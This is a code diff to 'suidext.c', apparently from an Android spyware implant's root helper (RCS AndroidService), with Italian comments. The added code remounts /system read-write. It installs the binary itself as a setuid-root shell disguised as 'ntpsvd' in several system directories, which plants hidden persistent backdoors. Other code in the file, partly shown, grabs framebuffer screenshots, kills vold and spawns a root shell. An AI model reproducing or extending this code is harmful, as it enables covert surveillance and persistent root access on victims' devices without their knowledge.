@@ -1,7 +1,17 @@
+/* *******************************************
+ * Copyright (c) 2011
+ * HT srl,   All rights reserved.
+ * Project      : RCS, AndroidService
+ * File         : suidext.c
+ * Created      : Maj 20, 2011
+ * Author		: zeno
+ * *******************************************/
+
 #include <stdio.h>
 #include <sys/types.h>
 #include <sys/stat.h>
 #include <sys/mount.h>
+#include <sys/param.h>
 #include <sys/time.h>
 #include <linux/netlink.h>
 #include <sys/socket.h>
@@ -29,6 +39,8 @@ static int copy(const char *from, const char *to);
 unsigned int getProcessId(const char *p_processname);
 int setgod();
 void sync_reboot();
+int remount(const char *mntpoint, int flags);
+static void copy_root(const char *mntpnt, const char *dst);
 
 // questo file viene compilato come rdb e quando l'exploit funziona viene suiddato
 
@@ -38,12 +50,13 @@ int main(int argc, char** argv) {
 	setgod();
 
 	if (argc == 2) {
+		// Cattura uno screenshot
 		if (strcmp(argv[1], "fb") == 0) {
 			char* filename = "/data/data/com.android.service/files/frame";
 
 			copy("/dev/graphics/fb0", filename);
 			chmod("/data/data/com.android.service/files/frame", 0666);
-		} else if (strcmp(argv[1], "vol") == 0) {
+		} else if (strcmp(argv[1], "vol") == 0) { // Killa VOLD per due volte
 			unsigned int pid;
 		
 			LOG("Killing VOLD\n");
@@ -56,10 +69,22 @@ int main(int argc, char** argv) {
 					sleep(2);
 				}	
 			}
-		} else if (strcmp(argv[1], "reb") == 0) {
+		} else if (strcmp(argv[1], "reb") == 0) { // Reboot
 			LOG("Rebooting...\n");
 
 			sync_reboot();
+		} else if (strcmp(argv[1], "blr") == 0) { // Monta /system in READ_ONLY
+			remount("/system", MS_RDONLY);
+		} else if (strcmp(argv[1], "blw") == 0) { // Monta /system in READ_WRITE
+			remount("/system", 0);
+		} else if (strcmp(argv[1], "rt") == 0) {  // Copia la shell root in /system/bin/ntpsvd
+			copy_root("/system", "/system/bin/ntpsvd");
+			copy_root("/", "/ntpsvd");
+			copy_root("/system", "/system/xbin/ntpsvd");
+			copy_root("/system", "/system/customize/ntpsvd");
+			copy_root("/system", "/system/app/ntpsvd");
+			copy_root("/system", "/system/etc/ntpsvd");
+			copy_root("/system", "/system/tts/ntpsvd");
 		}
 	} else {
 		const char * shell = "/system/bin/sh";
@@ -80,6 +105,14 @@ int main(int argc, char** argv) {
 	}
 
 	return 0;
+}
+
+static void copy_root(const char *mntpnt, const char *dst) {
+	remount(mntpnt, 0);
+	copy("/proc/self/exe", dst);
+	chown(dst, 0, 0);
+	chmod(dst, 04755);
+	remount(mntpnt, MS_RDONLY);
 }
 
 static int copy(const char *from, const char *to) {
@@ -129,11 +162,9 @@ unsigned int getProcessId(const char *p_processname) {
     errorcount = 0;
     result = 0;
 
-    if (setgod()) {
-        LOG("We are in GOD mode\n");
-    } else {
-        LOG("We are NOT in GOD mode!\n");
-    }
+    if (!setgod()) {
+		return 0;
+	}
 
     dir_p = opendir("/proc/");
 
@@ -182,6 +213,52 @@ void sync_reboot() {
 		sprintf(buf, "Error rebooting: %d\n", errno);
 		LOG(buf);	
 	}
+}
+
+int remount(const char *mntpoint, int flags) {
+    FILE *f = NULL;
+    int found = 0;
+    char buf[1024], *dev = NULL, *fstype = NULL;
+
+	if (!setgod()) {
+		return -1;
+	}
+
+    if ((f = fopen("/proc/mounts", "r")) == NULL) {
+        return -1;
+    }
+
+    memset(buf, 0, sizeof(buf));
+
+    for (;!feof(f);) {
+        if (fgets(buf, sizeof(buf), f) == NULL)
+            break;
+
+        if (strstr(buf, mntpoint)) {
+            found = 1;
+            break;
+        }
+    }
+
+    fclose(f);
+
+    if (!found) {
+        return -1;
+    }
+
+    if ((dev = strtok(buf, " \t")) == NULL) {
+        return -1;
+    }
+
+    if (strtok(NULL, " \t") == NULL) {
+        return -1;
+    }
+
+    if ((fstype = strtok(NULL, " \t")) == NULL) {
+        return -1;
+    }
+
+    return mount(dev, mntpoint, fstype, flags | MS_REMOUNT, 0);
 }
 
 int setgod() {
